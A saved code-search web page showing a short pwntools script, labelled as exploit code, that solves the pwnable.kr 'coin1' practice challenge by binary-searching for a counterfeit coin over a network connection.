alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">from</code> <code class="python plain">pwn </code><code class="python keyword">import</code> <code class="python keyword">*</code></div><div class="line number2 index1 alt1"><code class="python keyword">import</code> <code class="python plain">time</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="python plain">context.log_level </code><code class="python keyword">=</code> <code class="python string">'debug'</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="python keyword">def</code> <code class="python plain">getInfo():</code></div><div class="line number7 index6 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.recvuntil(</code><code class="python string">'='</code><code class="python plain">)</code></div><div class="line number8 index7 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">N </code><code class="python keyword">=</code> <code class="python functions">int</code><code class="python plain">(s.recvuntil(</code><code class="python string">' '</code><code class="python plain">)[:</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">])</code></div><div class="line number9 index8 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.recvuntil(</code><code class="python string">'='</code><code class="python plain">)</code></div><div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">C </code><code class="python keyword">=</code> <code class="python functions">int</code><code class="python plain">(s.recvuntil(</code><code class="python string">'\n'</code><code class="python plain">)[:</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">])</code></div><div class="line number11 index10 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">log.info(</code><code class="python string">'N = %d C = %d'</code> <code class="python keyword">%</code><code class="python plain">(N, C))</code></div><div class="line number12 index11 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">N, C</code></div><div class="line number13 index12 alt2">&nbsp;</div><div class="line number14 index13 alt1"><code class="python keyword">def</code> <code class="python plain">play(N):</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">start </code><code class="python keyword">=</code> <code class="python value">0</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">end </code><code class="python keyword">=</code> <code class="python plain">N</code></div><div class="line number17 index16 alt2">&nbsp;</div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python color1">True</code><code class="python plain">:</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python plain">''</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">expectWeight </code><code class="python keyword">=</code> <code class="python value">0</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mid </code><code class="python keyword">=</code> <code class="python plain">(start </code><code class="python keyword">+</code> <code class="python plain">end) </code><code class="python keyword">/</code> <code class="python value">2</code></div><div class="line number22 index21 alt1">&nbsp;</div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># make payload</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">i </code><code class="python keyword">in</code> <code class="python functions">range</code><code class="python plain">(start, mid):</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">expectWeight </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python value">10</code></div><div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python functions">str</code><code class="python plain">(i)</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python string">' '</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python plain">payload[:</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">]</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">payload </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python plain">'':</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python functions">str</code><code class="python plain">(start)</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.sendline(payload)</code></div><div class="line number32 index31 alt1">&nbsp;</div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">res </code><code class="python keyword">=</code> <code class="python plain">s.recvuntil(</code><code class="python string">'\n'</code><code class="python plain">)[:</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">]</code></div><div class="line number34 index33 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">res.isdigit() !</code><code class="python keyword">=</code> <code class="python color1">True</code><code class="python plain">:</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code> <code class="python string">'break'</code></div><div class="line number36 index35 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">realWeight </code><code class="python keyword">=</code> <code class="python functions">int</code><code class="python plain">(res)</code></div><div class="line number38 index37 alt1">&nbsp;</div><div class="line number39 index38 alt2">&nbsp;</div><div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">log.info(</code><code class="python string">'expectWeight = %d realWeight = %d'</code> <code class="python keyword">%</code><code class="python plain">(expectWeight, realWeight))</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># counterfeit coin at left side</code></div><div class="line number42 index41 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">expectWeight !</code><code class="python keyword">=</code> <code class="python plain">realWeight: </code></div><div class="line number43 index42 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code> <code class="python string">'left'</code></div><div class="line number44 index43 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">end </code><code class="python keyword">=</code> <code class="python plain">mid</code></div><div class="line number45 index44 alt2">&nbsp;</div><div class="line number46 index45 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># counterfeit coin at right side</code></div><div class="line number47 index46 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:&nbsp;&nbsp; </code></div><div class="line number48 index47 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code> <code class="python string">'right'</code></div><div class="line number49 index48 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">start </code><code class="python keyword">=</code> <code class="python plain">mid</code></div><div class="line number50 index49 alt1">&nbsp;</div><div class="line number51 index50 alt2">&nbsp;</div><div class="line number52 index51 alt1">&nbsp;</div><div class="line number53 index52 alt2"><code class="python plain">HOST </code><code class="python keyword">=</code> <code class="python string">'pwnable.kr'</code></div><div class="line number54 index53 alt1"><code class="python plain">PORT </code><code class="python keyword">=</code> <code class="python value">9007</code></div><div class="line number55 index54 alt2">&nbsp;</div><div class="line number56 index55 alt1"><code class="python plain">s </code><code class="python keyword">=</code> <code class="python plain">remote(HOST, PORT)</code></div><div class="line number57 index56 alt2"><code class="python functions">print</code> <code class="python plain">s.recv(</code><code class="python value">4096</code><code class="python plain">)</code></div><div class="line number58 index57 alt1"><code class="python plain">time.sleep(</code><code class="python value">3</code><code class="python plain">)</code></div><div class="line number59 index58 alt2">&nbsp;</div><div class="line number60 index59 alt1"><code class="python keyword">for</code> <code class="python plain">i </code><code class="python keyword">in</code> <code class="python functions">range</code><code class="python plain">(</code><code class="python value">100</code><code class="python plain">):</code></div><div class="line number61 index60 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">N, C </code><code class="python keyword">=</code> <code class="python plain">getInfo()</code></div><div class="line number62 index61 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">play(N)</code></div><div class="line number63 index62 alt2"><code class="python keyword">print</code> <code class="python plain">s.recv(</code><code class="python value">1024</code><code class="python plain">)</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
&lt;exploit code&gt; pwnable.kr[Toddler's Bottle] : coin1
</div>

</div>

</div>
<div id="footer">
<div>
Copyright 2015 - 2017 © Python Code Search Engine<br>
<a href="https://pythonexample.com/login" rel="nofollow">Login</a> <a href="https://pythonexample.com/register" rel="nofollow">Register</a> <a href="https://pythonexample.com/dmca" rel="nofollow">DMCA</a><br>
<a href="https://androidassetstudio.net/">android notification icon generator</a>
<a href="https://androidassetstudio.net/">notification icon generator</a>
<a href="https://androidassetstudio.net/">actionbar icon generator</a>
<a href="https://androidassetstudio.net/">image asset studio</a>
<a href="https://androidassetstudio.net/">android icon maker</a>
<a href="https://androidassetstudio.net/">android icon generator</a>
<a href="https://androidassetstudio.net/">launcher icon generator android</a>
<a href="https://androidassetstudio.net/">android studio launcher icon generator</a>
<a href="https://androidassetstudio.net/">android launcher generator</a>
<a href="https://androidassetstudio.net/">shortcut icon generator</a>
<a href="https://androidassetstudio.net/">online icon maker android</a>
<a href="https://androidassetstudio.net/">android asset studio</a>
<a href="https://androidassetstudio.net/">android asset generator</a>
<a href="https://androidassetstudio.net/">launcher generator android</a>
<a href="https://androidassetstudio.net/">icon generator android</a>
<a href="https://androidassetstudio.net/">icon launcher generator</a>
<a href="https://androidassetstudio.net/">android assets studio</a>
<a href="https://androidassetstudio.net/">online android icon maker</a>
<a href="https://androidassetstudio.net/">android launch icon generator</a>
<a href="https://androidassetstudio.net/">icon android generator</a>
<a href="https://androidassetstudio.net/">asset studio</a>
<a href="https://androidassetstudio.net/">material design app icon generator</a>
<a href="https://androidassetstudio.net/">launcher icon generator</a>
<a href="https://androidassetstudio.net/">android launcher icon generator</a>
<a href="https://androidassetstudio.net/">android icon generator online</a>
<a href="https://androidassetstudio.net/">android asset studio icon generator</a>
<a href="https://androidassetstudio.net/">asset generator</a>
<a href="https://androidassetstudio.net/">action bar generator</a>
<a href="https://androidassetstudio.net/">android app launcher icon generator</a>
<a href="https://androidassetstudio.net/">android asset</a>
<a href="https://androidassetstudio.net/">android icon launcher generator</a>
<a href="https://androidassetstudio.net/">android image asset studio</a>
<a href="https://androidassetstudio.net/">icon maker android</a>
<a href="https://androidassetstudio.net/">android icons generator</a>
<a href="https://androidassetstudio.net/">android app icon generator</a>
<a href="https://androidassetstudio.net/">android assets generator</a>
<a href="https://androidassetstudio.net/">launcher icon generator online</a>
<a href="https://androidassetstudio.net/">generator icon android</a>
</div>
</div>
</div>
</div>
<div style="text-align:center;">
</div>

<link href="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/shCore.css" rel="stylesheet" type="text/css">
<link href="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/shThemeDefault.css" rel="stylesheet" type="text/css">
<script src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/shCore.js" type="text/javascript"></script>
<script src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/shAutoloader.js" type="text/javascript"></script>
<script src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/main.js" type="text/javascript"></script>


<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-92780564-1', 'auto');
ga('send', 'pageview');
</script>


<script type="text/javascript" src="chrome-extension://jofjnbepnhcbfnpbhchillofcgpeopaj/js/public/common.js"></script><script type="text/javascript" src="chrome-extension://jofjnbepnhcbfnpbhchillofcgpeopaj/js/common/we-general.js"></script><ins class="adsbygoogle" data-adsbygoogle-status="done" style="display: none; width: auto; height: auto;"><ins id="aswift_0_expand" style="display:inline-table;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent"><ins id="aswift_0_anchor" style="display:block;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent"><iframe width="0" height="0" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;width:0px;height:0px;" src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/saved_resource(2).html"></iframe></ins></ins></ins><div class="google-auto-placed" style="text-align: center; width: 100%; height: auto; clear: both;"><ins data-ad-format="auto" class="adsbygoogle" data-ad-client="ca-pub-3617567196023504" data-adsbygoogle-status="done" style="display: block; margin: 10px auto; background-color: transparent; height: 90px;"><ins id="aswift_3_expand" style="display:inline-table;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:1200px;background-color:transparent"><ins id="aswift_3_anchor" style="display:block;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:1200px;background-color:transparent"><iframe width="1200" height="90" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_3" name="aswift_3" style="left:0;position:absolute;top:0;width:1200px;height:90px;" src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/saved_resource(3).html"></iframe></ins></ins></ins></div></body><div></div></html>